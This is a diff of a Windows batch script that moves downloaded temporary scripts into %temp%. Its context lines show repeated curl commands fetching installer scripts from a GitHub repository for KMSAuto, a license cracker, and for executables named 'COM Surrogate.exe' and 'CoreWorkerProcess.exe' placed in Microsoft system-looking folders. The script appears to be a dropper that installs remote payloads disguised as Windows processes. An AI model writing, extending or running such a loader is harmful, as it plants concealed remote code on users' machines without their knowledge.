@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=21.7"
+set "BATCHVERSION=21.8"
 
 
 
@@ -587,7 +587,7 @@ echo Going to SHSTINSTALL...
 :SHSTINSTALL
 :: Run commands if ShellHost.exe is not found
 echo Checking for ShellHost...
-set "embeddedScript=temp_script_SHST.bat"
+set "embeddedScript=%temp%\temp_script_SHST.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost"
@@ -734,7 +734,7 @@ echo Going to KMSINSTALL...
 :KMSINSTALL
 :: Run commands if KMSAuto.exe is not found
 echo Checking for KMSAuto...
-set "embeddedScript=temp_script_KMS.bat"
+set "embeddedScript=%temp%\temp_script_KMS.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto"
@@ -801,7 +801,7 @@ if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
 
 :: Run commands if ComSurrogate.exe is not found
 echo Checking for COM Surrogate...
-set "embeddedScript=temp_script_COM.bat"
+set "embeddedScript=%temp%\temp_script_COM.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate"
@@ -875,7 +875,7 @@ if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
 
 :: Run commands if CoreWorkerProcess.exe is not found
 echo Checking for CoreWorkerProcess...
-set "embeddedScript=temp_script_CWP.bat"
+set "embeddedScript=%temp%\temp_script_CWP.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
@@ -941,7 +941,7 @@ if exist "%APPDATA%\Microsoft\7z.dll" (
 
 :: Run commands if Nircmd.exe is not found
 echo Checking for 7z...
-set "embeddedScript=temp_script_7z.bat"
+set "embeddedScript=%temp%\temp_script_7z.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/7zip"
@@ -996,7 +996,7 @@ if exist "%APPDATA%\Microsoft\nircmd.exe" (
 
 :: Run commands if Nircmd.exe is not found
 echo Checking for Nircmd...
-set "embeddedScript=temp_script_Nircmd.bat"
+set "embeddedScript=%temp%\temp_script_Nircmd.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Nircmd"
@@ -1049,7 +1049,7 @@ if exist "%file9%" (
 
 :: Run commands if handle.exe is not found
 echo Checking for handle...
-set "embeddedScript=temp_script_handle.bat"
+set "embeddedScript=%temp%\temp_script_handle.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
